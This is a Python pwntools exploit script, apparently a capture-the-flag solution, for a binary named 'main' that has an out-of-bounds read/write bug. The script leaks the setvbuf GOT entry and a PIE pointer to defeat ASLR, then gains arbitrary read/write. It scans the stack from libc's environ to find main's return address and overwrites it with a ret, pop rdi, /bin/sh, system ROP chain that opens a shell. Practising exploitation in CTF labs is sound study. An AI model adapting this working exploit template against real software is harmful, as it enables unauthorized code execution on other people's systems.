#!/usr/bin/env python3
from pwn import *
import monkeyhex
import time
import argparse
import re
import os
from functools import partial
import logging

# Run with ipython3 -i solve.py -- DEBUG

# context.log_level = 'debug'
context.terminal = ['gnome-terminal', '-e']

_CACHED_LIBC_PATH = None
def get_preloadable_libc(path=None, libc_paths=[]):
    """
    Recursively search the working directory for libc
    """
    global _CACHED_LIBC_PATH
    if _CACHED_LIBC_PATH is not None:
        return _CACHED_LIBC_PATH
    if path is None:
        path = os.getcwd()
    for root, dirs, files in os.walk(path):
        for f in files:
            # match common libc-2.31.so and libc.so.6 formats
            match = re.search(r'libc(\.so\.6|-\d+\.\d+\.so)', f)
            if match is not None:
                libc_paths.append(os.path.join(root, f))

    if len(libc_paths) > 0:
        return libc_paths[0]
    return None

# this variable will be filled in with an `ELF` object if
# there is a libc in the same directory as (or child directories of) the script
libc = None
script_directory = os.path.dirname(os.path.abspath(__file__))
LIBC_PATH = get_preloadable_libc(path=script_directory)
if libc is None and LIBC_PATH is not None:
    libc = ELF(LIBC_PATH)
    binsh_offset = libc.data.find(b'/bin/sh')
    if binsh_offset != -1:
        libc.sym['binsh'] = libc.offset_to_vaddr(binsh_offset)

    # libc.sym['one_gadget'] = argparse_args.one_gadget[0] if argparse_args.one_gadget else 0
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') if not args.REMOTE else ELF('libc.so.6')
binary = context.binary = ELF('main')


def attach_gdb(p, commands=None):
    """Template to run gdb with predefined commands on a process."""
    val = """
    c
    """ if commands is None else commands
    res = gdb.attach(p, val)
    pause()
    return res


def new_proc(start_gdb=False, gdbscript=None, force_unbuffered=False,
             skip_libc_preload=False,
             preload_libs=None, ld_libpath_cwd=False):
    """
    Start a new process with predefined debug operations.
    @start_gdb: start gdb on process start up
    @gdbscript: default gdbscript to use
    @force_unbuffered: force input to be unbuffered. Use this if outputs arent
                       getting back to you but the program is sending them,
                       or if there is just general input/output weirdness
    @skip_libc_preload: By default this script will attempt to LD_PRELOAD any
                        libc.so.6 (or other libc). If this behavior is not
                        what you want, you can disable it by setting this
                        to True
    @preload_libs: If you would like to preload additional libraries, pass a
                   list of their paths here
   @ld_libpath_cwd: Often, binaries are meant for a different OS version or
                    different distribution of linux entirely from your current
                    one. If you wish to run them without setting up a docker
                    container you can do so by extracting the desired libraries
                    from a docker container (`get_docker_libs.sh` helps)
                    then patching your binary with
                    patchelf --set-interpreter "<ld-interpreter>" "<binary>"
                    and setting this variable. This is exceptionally overkill,
                    but prevents you from having to debug/test through a docker
                    container, which is a bit of a pain
    """
    kwargs = {}
    kwargs["env"] = {}
    # if there is a libc in the current directory
    global LIBC_PATH
    if skip_libc_preload is False:
        if LIBC_PATH is not None:
            if preload_libs:
                preload_libs.append(LIBC_PATH)
            else:
                preload_libs = [LIBC_PATH]
    if preload_libs:
        cwd = os.getcwd()
        preload_libs = [os.path.join(cwd, i) if not i.startswith("/") else i
                        for i in preload_libs]
        ld_preload = kwargs['env'].get('LD_PRELOAD')
        if ld_preload:
            ld_preload = ld_preload.split(" ")
        else:
            ld_preload = []
        ld_preload.extend(preload_libs)
        kwargs['env']['LD_PRELOAD'] = " ".join(ld_preload)

    if ld_libpath_cwd:
        kwargs['env']['LD_LIBRARY_PATH'] = os.getcwd()

    if force_unbuffered is True:
        kwargs['stdin'] = process.PTY
        kwargs['stdout'] = process.PTY

    p = process(binary.path, **kwargs)
    if start_gdb is True:
        attach_gdb(p, gdbscript)
    return p


p = new_proc(context.log_level == logging.DEBUG) if not args.REMOTE else remote('localhost', 8000)
# do leak / payload gen here

def batch(it, sz):
    for i in range(0, len(it), sz):
        yield it[i:i+sz]

def oob_read_int(index):
    p.sendafter(b'\n> ', b'1\n')
    p.sendafter(b'\n> ', b'%d\n' % index)
    a = p.recvuntil(b'\n')
    return int(a, 0)

def oob_read_bytes(index, size):
    read_bytes = b''
    for i in range(index, index+(size//4)):
        read_bytes += p32(oob_read_int(i))
    return read_bytes

def oob_write_int(index, val):
    p.sendafter(b'\n> ', b'2\n')
    p.sendafter(b'\n> ', b'%d\n' % index)
    p.sendafter(b'\n> ', b'%d\n' % val)

def oob_write_bytes(index, bytevals):
    read_bytes = b''
    byteval_len = len(bytevals)
    align_adjust = 0
    rem = (byteval_len % 4)
    if rem != 0:
        align_adjust = 1
        bytevals += rem*b'\x00'
    num_writes = (byteval_len//4)+align_adjust
    for i, write_bytes in enumerate(batch(bytevals, 4)):
        val = u32(write_bytes)
        oob_write_int(index+i, val)
    return

def calc_ind_for_binary_offset(binary_offset):
    return ((binary_offset-binary.sym['g_global_buffer'])//4)

def trigger():
    # send the `exit` command to execute whatever is in the
    # got entry for `exit`
    p.send(b'3\n')

setvbuf_got_ind = calc_ind_for_binary_offset(binary.sym['got.setvbuf'])
leaked_setvbuf_addr_bytes = oob_read_bytes(setvbuf_got_ind, 8)

setvbuf_leak = u64(leaked_setvbuf_addr_bytes)
log.success("leaked setvbuf %#x" % setvbuf_leak)

# solvers must determine libc version here based off of leak addresses
# with libc database unless libc is provided by hosts
addr_candidate = setvbuf_leak - libc.sym['setvbuf']
log.success("libc base addr candidate %#x" % addr_candidate)
assert (addr_candidate & 0xfff) == 0
libc.address = addr_candidate
log.success("leaked libc %#x" % libc.address)

# read any symbol that has a relocation entry made for it to find a pointer to
# the binary. NOTE this will only work for binaries built with PIE
frame_dummy_ind = calc_ind_for_binary_offset(binary.sym['__frame_dummy_init_array_entry'])
frame_dummy_array_entry_bytes = oob_read_bytes(frame_dummy_ind, 8)
frame_dummy_leak = u64(frame_dummy_array_entry_bytes)
log.success("leaked frame dummy %#x" % frame_dummy_leak)

addr_candidate = frame_dummy_leak - binary.sym['frame_dummy']
log.success("binary base addr candidate %#x" % addr_candidate)
assert (addr_candidate & 0xfff) == 0
binary.address = addr_candidate

log.success("leaked binary address %#x" % binary.address)
log.success("arbitrary read/write ready")

# now that actual address of both the current binary is known
# and has been updated for the `binary` ELF object, the oob read/write
# can function as an arbitrary read/write so long as the index is
# calculated correctly with the absolute address of `g_global_buffer`
# like `calc_ind_for_binary_offset` does

# define the arb_* functions here so that they can only be used after
# the arbitrary read/write has been set up successfully
def arb_read_bytes(address, size):
    ind = calc_ind_for_binary_offset(address)
    return oob_read_bytes(ind, size)

def arb_read_u64(address):
    return u64(arb_read_bytes(address, 8))

def arb_write_bytes(address, bytevals):
    ind = calc_ind_for_binary_offset(address)
    oob_write_bytes(ind, bytevals)

def arb_write_u64(address, val):
    bytevals = p64(val)
    arb_write_bytes(address, bytevals)


stack_addr = arb_read_u64(libc.sym['environ'])

log.progress("searching for main's return address on the stack")
main_func_size = binary.functions['main'].size
main_func_addr = binary.sym['main']
main_func_end = main_func_addr+main_func_size
curr_addr = stack_addr
ip_control_addr = 0
while True:
    read_val = arb_read_u64(curr_addr)
    # want an address explicitly greater than main's start
    # so that we know it is a return addr
    if read_val > main_func_addr and read_val < main_func_end:
        log.success("found main's return address on the stack at %#x: %#x" % (curr_addr, read_val))
        ip_control_addr = curr_addr
        break
    curr_addr -= 8

log.success("found main's return address on the stack at %#x" %
            ip_control_addr)

# arb_write_bytes(ip_control_addr, cyclic(32))
r = ROP(libc)

ret = [k for k, v in r.gadgets.items() \
               if v.insns == ['ret']][0]
pop_rdi_ret = [k for k, v in r.gadgets.items() \
               if v.insns == ['pop rdi', 'ret']][0]

binsh_offset = libc.data.find(b'/bin/sh')
if binsh_offset != -1:
    libc.sym['binsh'] = libc.offset_to_vaddr(binsh_offset)

payload_addrs = []
if ip_control_addr % 0x10 != 0:
    # adjust call to system so that stack is aligned to 0x10, as
    # system sometimes needs that
    payload_addrs += [
        ret,
    ]
payload_addrs += [
    pop_rdi_ret,
    libc.sym['binsh'],
    libc.sym['system']
]

payload = flat({0: payload_addrs})

log.progress("writing payload to the stack")
# overwrite the return address from vuln -> main with the ropchain
arb_write_bytes(ip_control_addr, payload)
log.success("Popping shell")
# return from vuln by exiting the function
trigger()
p.interactive()
